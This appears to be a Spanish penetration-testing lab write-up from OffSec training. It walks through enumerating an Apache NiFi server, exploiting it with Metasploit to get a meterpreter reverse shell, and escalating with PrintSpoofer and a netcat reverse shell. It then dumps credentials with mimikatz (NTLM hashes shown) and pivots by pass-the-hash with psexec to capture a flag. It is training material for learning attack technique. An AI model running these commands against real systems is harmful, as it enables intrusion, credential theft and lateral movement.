# {CATEGORÍA}: {DESCRIPCIÓN}

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}
## Objetivo
{OBJETIVO}
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion:
1. .225:

* Nmap: MSF
```bash
msf6 > db_nmap -sV -sC 192.168.129.225 -Pn 
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 15:51 -03
[*] Nmap: Nmap scan report for 192.168.129.225
[*] Nmap: Host is up (0.19s latency).
[*] Nmap: Not shown: 996 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 8080/tcp open  http          Jetty 9.4.48.v20220622
[*] Nmap: |_http-server-header: Jetty(9.4.48.v20220622)
[*] Nmap: |_http-open-proxy: Proxy might be redirecting requests
[*] Nmap: |_http-title: NiFi
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   3:1:1:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2025-06-30T18:54:40
[*] Nmap: |_  start_date: N/A
[*] Nmap: |_clock-skew: -4s
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 184.27 seconds
msf6 > hosts

Hosts
=====

address          mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------          ---  ----  -------  ---------  -----  -------  ----  --------
192.168.129.225             Unknown                    device

msf6 > services
Services
========

host             port  proto  name          state  info
----             ----  -----  ----          -----  ----
192.168.129.225  135   tcp    msrpc         open   Microsoft Windows RPC
192.168.129.225  139   tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
192.168.129.225  445   tcp    microsoft-ds  open
192.168.129.225  8080  tcp    http          open   Jetty 9.4.48.v20220622

msf6 > db_nmap -A 192.168.129.225
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 17:13 -03
[*] Nmap: Nmap scan report for 192.168.129.225
[*] Nmap: Host is up (0.19s latency).
[*] Nmap: Not shown: 996 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 8080/tcp open  http          Jetty 9.4.48.v20220622
[*] Nmap: |_http-open-proxy: Proxy might be redirecting requests
[*] Nmap: |_http-title: NiFi
[*] Nmap: |_http-server-header: Jetty(9.4.48.v20220622)
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.95%E=4%D=6/30%OT=135%CT=1%CU=35254%PV=Y%DS=4%DC=T%G=Y%TM=6862F1
[*] Nmap: OS:0C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=I%CI=I%TS=A)SEQ(SP=
[*] Nmap: OS:103%GCD=1%ISR=105%TI=I%CI=I%TS=A)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%TS=A
[*] Nmap: OS:)SEQ(SP=105%GCD=1%ISR=10E%TI=I%CI=I%TS=A)SEQ(SP=107%GCD=1%ISR=104%TI=I%C
[*] Nmap: OS:I=I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST1
[*] Nmap: OS:1%O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF
[*] Nmap: OS:%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%
[*] Nmap: OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
[*] Nmap: OS:RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W
[*] Nmap: OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RI
[*] Nmap: OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)
[*] Nmap: Network Distance: 4 hops
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   3:1:1:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2025-06-30T20:18:12
[*] Nmap: |_  start_date: N/A
[*] Nmap: |_clock-skew: -3s
[*] Nmap: TRACEROUTE (using port 80/tcp)
[*] Nmap: HOP RTT       ADDRESS
[*] Nmap: 1   250.18 ms 192.168.45.1
[*] Nmap: 2   250.14 ms 192.168.45.254
[*] Nmap: 3   250.20 ms 192.168.251.1
[*] Nmap: 4   250.53 ms 192.168.129.225
```

* Version **NiFi**

```bash
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.2.3-PortForwarding-Socat]
└─# curl -s http://192.168.129.225:8080/nifi-api/flow/about | jq
{
  "about": {
    "title": "NiFi",
    "version": "1.18.0-SNAPSHOT",
    "uri": "http://192.168.129.225:8080/nifi-api/",
    "contentViewerUrl": "../nifi-content-viewer/",
    "timezone": "PDT",
    "buildTag": "nifi-1.15.0-RC3",
    "buildRevision": "34084d0",
    "buildBranch": "main",
    "buildTimestamp": "07/27/2022 22:24:06 PDT"
  }
}
```

* Flujos de ejecucion:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.2.3-PortForwarding-Socat]
└─# curl -s http://192.168.129.225:8080/nifi-api/flow/process-groups/root | jq
{
  "permissions": {
    "canRead": true,
    "canWrite": true
  },
  "processGroupFlow": {
    "id": "828e7c72-0183-1000-ebb9-3aebaada7963",
    "uri": "http://192.168.129.225:8080/nifi-api/flow/process-groups/828e7c72-0183-1000-ebb9-3aebaada7963",
    "breadcrumb": {
      "id": "828e7c72-0183-1000-ebb9-3aebaada7963",
      "permissions": {
        "canRead": true,
        "canWrite": true
      },
      "breadcrumb": {
        "id": "828e7c72-0183-1000-ebb9-3aebaada7963",
        "name": "NiFi Flow"
      }
    },
    "flow": {
      "processGroups": [],
      "remoteProcessGroups": [],
      "processors": [],
      "inputPorts": [],
      "outputPorts": [],
      "connections": [],
      "labels": [],
      "funnels": []
    },
    "lastRefreshed": "15:45:09 PDT"
  }
}
```
* Plantillas:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.2.3-PortForwarding-Socat]
└─# curl -s http://192.168.129.225:8080/nifi-api/flow/templates | jq
{
  "templates": [],
  "generated": "15:48:45 PDT"
}
```

2. .226

#### Paso 2: Buscamos el exploit en MSF y loejecutamos contra .225

```bash
msf6 exploit(multi/http/apache_nifi_processor_rce) > search type:exploit Apache nifi

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_nifi_processor_rce  2020-10-03       excellent  Yes    Apache NiFi API Remote Code Execution
   1    \_ target: Unix (In-Memory)                 .                .          .      .
   2    \_ target: Windows (In-Memory)              .                .          .      .
   3  exploit/linux/http/apache_nifi_h2_rce         2023-06-12       excellent  Yes    Apache NiFi H2 Connection String Remote Code Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/apache_nifi_h2_rce
```
* Configuramos las opciones:
> incluir **set SSL false** en show advanced
```bash
msf6 exploit(multi/http/apache_nifi_processor_rce) > options

Module options (exploit/multi/http/apache_nifi_processor_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   BEARER-TOKEN                   no        JWT authenticate with
   DELAY         5                yes       The delay (s) before stopping and deleting the processor
   PASSWORD                       no        Password to authenticate with
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        192.168.129.225  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         8080             yes       The target port (TCP)
   TARGETURI     /                yes       The base path
   USERNAME                       no        Username to authenticate with
   VHOST                          no        HTTP server virtual host


Payload options (cmd/windows/powershell/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.45.213   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   1   Windows (In-Memory)

msf6 exploit(multi/http/apache_nifi_processor_rce) > run
[*] Started reverse TCP handler on 192.168.45.213:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Apache NiFi instance does not support logins
[*] Sending stage (203846 bytes) to 192.168.165.225
[*] Meterpreter session 2 opened (192.168.45.213:4444 -> 192.168.165.225:49707) at 2025-06-30 20:31:48 -0300
[*] Waiting 5 seconds before stopping and deleting
[+] Processor Stop sent successfully
[+] Processor Delete sent successfully

meterpreter > 
```

#### Escalamos privilegios:

* PrintSpoofer 

```powershell
PS C:\Users\alex> iwr -uri http://192.168.45.213:8000/PrintSpoofer64.exe -Outfile print.exe
iwr -uri http://192.168.45.213:8000/PrintSpoofer64.exe -Outfile print.exe

PS C:\Users\alex>  iwr -uri http://192.168.45.213:8000/nc.exe -Outfile nc.exe
 iwr -uri http://192.168.45.213:8000/nc.exe -Outfile nc.exe

PS C:\Users\alex> .\print.exe -c "C:\Users\alex\nc.exe 192.168.45.213 1234 -e cmd"
.\print.exe -c "C:\Users\alex\nc.exe 192.168.45.213 1234 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
PS C:\Users\alex>
```

* Receptor:

```powershell
┌──(root㉿kali)-[/home/kali/OffSec/21-MSF/Capstones]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.165.225] 50153
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

#### Importamos mimikatz:

```powershell
PS C:\Users\Administrator> iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimi.exe
iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimi.exe
PS C:\Users\Administrator> .\mimi.exe
.\mimi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 830723 (00000000:000cad03)
Session           : Batch from 0
User Name         : offsec
Domain            : ITWK03
Logon Server      : ITWK03
Logon Time        : 3/28/2024 8:56:32 PM
SID               : S-1-5-21-697536651-98314752-489439087-1001
        msv :
         [00000003] Primary
         * Username : offsec
         * Domain   : ITWK03
         * NTLM     : b26462f877427f4f6a87605d587ac60d
         * SHA1     : f237f7e3b1958e6047f1b29716a2f776dbdb5a19
        tspkg :
        wdigest :
         * Username : offsec
         * Domain   : ITWK03
         * Password : (null)
        kerberos :
         * Username : offsec
         * Domain   : ITWK03
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 138206 (00000000:00021bde)
Session           : Service from 0
User Name         : itwk04admin
Domain            : ITWK03
Logon Server      : ITWK03
Logon Time        : 3/28/2024 8:54:16 PM
SID               : S-1-5-21-697536651-98314752-489439087-1003
        msv :
         [00000003] Primary
         * Username : itwk04admin
         * Domain   : ITWK03
         * NTLM     : 445414c16b5689513d4ad8234391aacf
         * SHA1     : 3b25183b0c39fd03069f586c7d238160f54b6cd7
        tspkg :
        wdigest :
         * Username : itwk04admin
         * Domain   : ITWK03
         * Password : (null)
        kerberos :
         * Username : itwk04admin
         * Domain   : ITWK03
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 129694 (00000000:0001fa9e)
Session           : Batch from 0
User Name         : alex
Domain            : ITWK03
Logon Server      : ITWK03
Logon Time        : 3/28/2024 8:54:16 PM
SID               : S-1-5-21-697536651-98314752-489439087-1002
        msv :
         [00000003] Primary
         * Username : alex
         * Domain   : ITWK03
         * NTLM     : 5391f1724568f48a4aadba748109864c
         * SHA1     : 3c0c8334c4b5a80345d40e00550539a7c847809c
        tspkg :
        wdigest :
         * Username : alex
         * Domain   : ITWK03
         * Password : (null)
        kerberos :
         * Username : alex
         * Domain   : ITWK03
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/28/2024 8:54:15 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 78651 (00000000:0001333b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/28/2024 8:54:14 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : ITWK03$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 78632 (00000000:00013328)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/28/2024 8:54:14 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : ITWK03$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ITWK03$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 3/28/2024 8:54:14 PM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : ITWK03$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : itwk03$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 47905 (00000000:0000bb21)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2024 8:54:14 PM
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : ITWK03$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 47889 (00000000:0000bb11)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2024 8:54:14 PM
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : ITWK03$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 46317 (00000000:0000b4ed)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/28/2024 8:54:14 PM
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ITWK03$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 3/28/2024 8:54:14 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : ITWK03$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : itwk03$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO
```


#### Obtenemos acceso al otro host y capturamos el flag

* Extraemos del hash NTLM de **itwk04admin** y ejecutamos PTH

```bash
┌──(root㉿kali)-[/home/kali/OffSec/21-MSF/Capstones]
└─# impacket-psexec -hashes :445414c16b5689513d4ad8234391aacf ITWK04/itwk04admin@192.168.165.226
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.165.226.....
[*] Found writable share ADMIN$
[*] Uploading file KHGXSjqW.exe
[*] Opening SVCManager on 192.168.165.226.....
[*] Creating service PdRW on 192.168.165.226.....
[*] Starting service PdRW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
C:\Users\itwk04admin> cd Desktop
 
C:\Users\itwk04admin\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 045A-A868

 Directory of C:\Users\itwk04admin\Desktop

06/30/2025  04:29 PM    <DIR>          .
12/14/2022  08:49 AM    <DIR>          ..
06/30/2025  04:29 PM                38 flag.txt
12/05/2022  04:48 AM             2,350 Microsoft Edge.lnk
               2 File(s)          2,388 bytes
               2 Dir(s)   1,707,331,584 bytes free

C:\Users\itwk04admin\Desktop> type flag.txt
OS{5354584841bc6b7c5a974bd6dada7088}

C:\Users\itwk04admin\Desktop> 

```
